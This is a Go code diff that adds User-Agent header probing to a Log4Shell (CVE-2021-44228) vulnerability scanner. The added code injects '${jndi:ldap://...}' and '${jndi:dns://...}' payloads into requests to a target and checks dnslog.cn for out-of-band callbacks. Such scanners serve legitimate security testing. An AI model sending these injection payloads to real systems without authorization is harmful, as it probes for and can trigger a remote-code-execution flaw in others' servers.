@@ -13,7 +13,7 @@ import (
 const GETURL = "http://dnslog.cn/getdomain.php"
 const FETCHURL = "http://dnslog.cn/getrecords.php"
 const HEADPATH = "data/headers.txt"
-const PARAMSPATH = "data/params.txt"
+const USERAGENT = "data/user-agents.txt"
 const URLPATH = "data/urls.txt"
 
 func ReadHeader(path string) ([]string, error) {
@@ -134,7 +134,7 @@ func HeaderScan(domain string, session string, url string)  {
 		new_payload := fmt.Sprintf("%s:%s", header, payload_req.Get(header))
 		result := GetHttp(FETCHURL, session)
 		if result == "" {
-			fmt.Println("[***] Payload : ", new_payload)
+			fmt.Println("[***] Payload Header : ", new_payload)
 			os.Exit(0)
 		}
 		if result == "[]" {
@@ -167,7 +167,7 @@ func UrlsScan(domain string, session string, url string)  {
 		PayloadGetHttpUrl(new_url)
 		result := GetHttp(FETCHURL, session)
 		if result == "" {
-			fmt.Println("[***] Payload : ", new_url)
+			fmt.Println("[***] Payload URL : ", new_url)
 			os.Exit(0)
 		}
 		if result == "[]" {
@@ -185,6 +185,41 @@ func UrlsScan(domain string, session string, url string)  {
 
 }
 
+func UserAgentScan(domain string, session string, url string)  {
+
+	user_agents, err := ReadHeader(USERAGENT)
+	if err != nil {
+		log.Fatalf("Error to read file : %s", err)
+		os.Exit(0)
+	}
+	for i, user_agent := range user_agents {
+
+		fmt.Println("[+++] Your domain generated : " , domain)
+		fmt.Println("[+++] Your session is : ", session)
+		payload := fmt.Sprintf("%s${jndi:ldap://%s/}", user_agent ,domain)
+		payload_req := PayloadGetHttp(url, "User-Agent" ,payload)
+		new_payload := fmt.Sprintf("%s:%s", user_agent, payload_req.Get("User-Agent"))
+		result := GetHttp(FETCHURL, session)
+		if result == "" {
+			fmt.Println("[***] Payload : ", new_payload)
+			os.Exit(0)
+		}
+		if result == "[]" {
+			fmt.Println("[***] Payload User-Agent : ", new_payload)
+			fmt.Println("[---] Isn't to vulnerability CVE-2021-44228")
+			fmt.Printf("#################### %v ############################", i)
+			continue
+		} else {
+			fmt.Println("[***] Payload : ", new_payload)
+			fmt.Println("[***] DNS log result : ", result)
+			fmt.Println("[***] Is Vulnerability to CVE-2021-44228 - [critical]")
+			os.Exit(0)
+		}
+	}
+
+	PayloadGetHttp(url, "User-Agent", "Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT)${jndi:dns://vuaynl.dnslog.cn}")
+}
+
 func main()  {
 
 	var url string
@@ -198,7 +233,6 @@ func main()  {
 	domain, session :=  GetHttpWithoutSession(GETURL)
 	// TODO - check is not null
 	//HeaderScan(domain, session, url)
-	UrlsScan(domain, session, url)
-
-
+	//UrlsScan(domain, session, url)
+	UserAgentScan(domain, session, url)
 }
